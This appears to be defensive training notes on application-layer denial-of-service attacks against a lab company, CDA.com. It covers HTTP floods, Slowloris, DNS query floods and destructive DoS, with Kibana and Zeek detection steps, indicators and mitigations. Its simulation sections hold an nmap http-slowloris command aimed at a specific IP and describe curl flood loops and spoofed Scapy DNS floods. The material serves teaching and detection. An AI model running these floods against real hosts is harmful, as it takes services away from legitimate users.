- Border router/firewall packet inspection

### Application Attacks
- Application DoS attacks leverage an attacker’s knowledge of the inner workings of an application or service in order to consume resources on the host.
- Each service can only actively support a certain amount of connections based on resources available and bandwidth.
- These attacks attempt to overwhelm a service (e.g., Apache) with some novel use of a connection, or by the sheer number of clients connecting to the service.
- CDA.com defenders noticed a lot more connections to an external web server — in fact, more connections existed than the number of authorized testers of the application.
- The requests seemed like legitimate HTTP requests, but they were continuous and from multiple hosts.

#### DETECTION THROUGH KIBANA
1. Open Kibana, and Select _Network_, then _HTTP_ under DataSets
2. Ensure Timeframe is correct
3. Filter on the Destination IP in question (`destination.ip: 104.53.222.2` in this case)
4. Pay attention to the _Source IP_ and _UserAgent_ panes
5. Filter down on _Macintosh UserAgent_ string (All of these events came from the same IP address)
6. Remove filter and add the _MSIE 6.0 UserAgent_ String
7. Pay attention to _Security Onion - HTTP - URI_ pane (**NOTE**: The curl/7.74.0 UserAgent is very generic, but the 9,000+ directory and file requests looks very much like a tool such as OWASP DirBuster or command line DIRB. Neither of these tools is a DoS tool, but they are often used for reconnaissance to find possible vulnerabilities or misconfigurations. In this case, DIRB was used with the default wordlist to scan www.cda.com from a bot net.)
8. Remove filter and add the _curl/7.74.0 UserAgent_ string

### HTTP Floods
- HTTP floods are the simplest of attacks, where an attacker simply makes a high volume of HTTP requests to a target.
- In order for an HTTP flood to be a successful attack, there has to be a large number of requests.
- This is easily accomplished with a botnet — a large network of compromised devices being manipulated by attackers.

#### Simulation
- The following Bash code performs two tasks:
  - Line 1 continuously requests the www.cda.com webpage until it is canceled.
  - Line 2 — without the comment (#) — continuously requests www.cda.com and www.cda.com:8080 websites in the background, which significantly increases the amount of requests because the previous curl is still running in the background.

    <img width="612" height="57" alt="image" src="https://github.com/user-attachments/assets/ed5f704d-2c97-4412-8cc6-fef5190e9596" />

#### Indicators
- Higher than baseline attempts for servicesSimilar UserAgent and request counts for webpages

#### Mitigations/Countermeasures
- Prioritize IP space
- Have a cached version of dynamic websites (database backend) to decrease load

### Sloth
- CDA.com defenders noted multiple connections to the web servers had extremely long durations.
- This is very peculiar because the sites currently only contain the default webpages, which do not contain a lot of content for a single connection to load.
- A Google search for the specific UserAgent string and DoS points to a Python script used to execute a Slowloris DoS, which uses the UserAgent string as one of the defaults.
  - `dos "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"`

    <img width="750" height="419" alt="23b6790f-7b04-4d6b-bb27-eae8c8e25136" src="https://github.com/user-attachments/assets/e6bddb4f-96ee-4f61-9491-3d35166a158e" />

#### Slowloris
- Slowloris is an interesting DDoS technique. Instead of increasing the amount of data being sent to a server to overload its resources, the connection is slowed down as much as possible.
- This decreases the load on the attacker, which allows them the opportunity to start another connection to the server.
- Meanwhile, the server is holding the original connection open, waiting for the next portion of data to be sent from the attacker.
- HTTP requests have a very specific format and syntax requirement. One such requirement is that the server waits for a client to send two empty lines before processing any sort of request.
- In a Slowloris attack, the client (attacker) sends a GET request — instead of sending the empty lines as required, the attacker sends data to the web server every 15 seconds or so.
- This tells the server that the connection is still alive, causing it to hold resources open to wait for a properly-formed request.
- The attacker continues to create more requests using the same technique until all the network sockets or processes available to the web server are busy.

### Simulation
- The following Bash code executes a Nmap script called **http-slowloris** against the 104.53.222.2 **host on ports 80 and 8080** with a maximum of **400 parallel connections**.
  - `nmap -p 80,8080 --script http-slowloris --max-parallelism 400 104.53.222.2`

#### Indicators
- Long duration HTTP connections with very little data
- Zeek: Add filter event.duration between 100 and 1,000,000

#### Mitigations
- Apache servers have a module for patching, Microsoft IIS is not affected by this technique
- Setup reverse proxies, firewalls, load balancers, or content switches or migrate to unaffected by the attack
- Block attacking IP — connections must be from a valid IP

### Address
- CDA.com defenders know port 80 and 8080 have been thoroughly flooded, so they decided to check into port 53 traffic as well.
- UDP does not have to worry about DoS attacks that attack the TCP handshake, but attacking an application over UDP is still a very real threat.
1. Open up Kibana, Select _Network_ and then_DNS_
2. Set timeframe as required
3. Filter for destination IP of interest (104.53.222.2 in this case)
4. Analyze the _Source IP_ pane, paying attention to the fact that one of the IP's is a router IP; Filter on this Source IP
5. Scroll down and investigate the _DNS - Query_ pane. Sort this from High to Low
- All queries seem to be unique in this case
- The attack did not render the DNS server in this scenario inaccessible, but there was a significant spike in network resource usage during the event:

  <img width="898" height="603" alt="cb44bd99-cf93-43e6-a82d-d63d46ee0c4b" src="https://github.com/user-attachments/assets/8adc0c40-764c-4f5b-ab10-be6ec9c4d815" />

### DNS Query Flood
- DNS Query floods use legitimate DNS request formats to request a large amount of random DNS subdomains and DNS request types.
- The randomized subdomain requests force the DNS server to request DNS information for that subdomain's authoritative DNS server, which increases the amount of traffic flying around.
- The source IP is usually spoofed in order to decrease the likelihood of attribution back to the attacker, as well as the attacker’s bandwidth requirements.
- This attack attempts to fill up the DNS cache and overwhelm resources on the DNS server, which decreases the server’s availability to legitimate users.

#### Simulation
- The following simulated Scapy code submits a DNS Query request to the 104.53.222.2 server for a random_uuid.cda.com as fast as the host can send the packets.
- The source IP is spoofed so all traffic is routed to the .1, which would be ignored as unsolicited packets.

  <img width="658" height="125" alt="image" src="https://github.com/user-attachments/assets/a978a904-5433-46a8-b60d-f8b641e1ab43" />

#### Indicators
- Spike in DNS requests from baseline

#### Mitigations/Countermeasures
- Develop distributed DNS system with capability, absorb, and block all attack traffic in real-time

### Destructive DoS Attacks
- The final DoS discussed in this lesson is often an afterthought — if a malicious actor wants to deny legitimate users access to a host, why not take the host down in some fashion?
- This type of attack is usually deliberate, but may be accidentally caused by **upgrades**, **patches**, or other **legitimate activity** being performed on the host.
- For example, the adversary may exploit a vulnerability on a host in order to crash it.
- Alternatively, if an attacker has been able to gain remote access to a web server or database server, they can deny access to the website by deleting or encrypting content so that no one can access the site.
- Ransomware attacks, such as the 2021 Colonial Pipeline attack, are predicated on the concept of destructive DoS attacks — attackers hope to cause so much damage by encrypting the victim’s data, that the victim pays a large sum of money to the attacker in order to restore normal operations.
- Intentional destructive attacks usually require that an attacker gain access to a host.
- Additionally, these attacks are generally less likely to occur because an attacker that took the time to gain access to a host may not want to lose that access by taking the host down.
- However, this avenue should still be considered a possible way for attackers to deny access to a resource.

#### Simulation
- A simple destructive DoS attack on the CDA.com website might involve the rename of the index.html file.
- This file is the default HTML page used by most applications — removal or renaming of this file would cause users navigating to the site’s home page to receive a 404 error, as the web server tries to load the index.html file but fails to find it.
- A simple rename like this could be performed using the following commands.
- The commands first use Secure Shell (SSH) to provide remote access to the web server.
- The mv command then renames the default webpage to a different filename, effectively denying access to that page for all users.

  <img width="415" height="61" alt="image" src="https://github.com/user-attachments/assets/cfdc09c6-4321-415b-a940-ba9ad95a1cf3" />

- In this example, the attacker likely gained access to the web server using already-compromised credentials, as evidenced by the commands' reliance on the CDA.com private key.
- Once the attacker gains access to the web server console, they can change anything they want on the website.
- This may include the destruction of the site, as noted above, or the intentional defacement of the content hosted on the web server. 

#### Indicators
- Monitor for non-standard access to devicesMonitor for long-duration connections to websites

#### Mitigations/Countermeasures
- Monitor access to remotely accessible sites for non standard user connections
- Limit remote access to specific systemsUpdate passwords from defaults


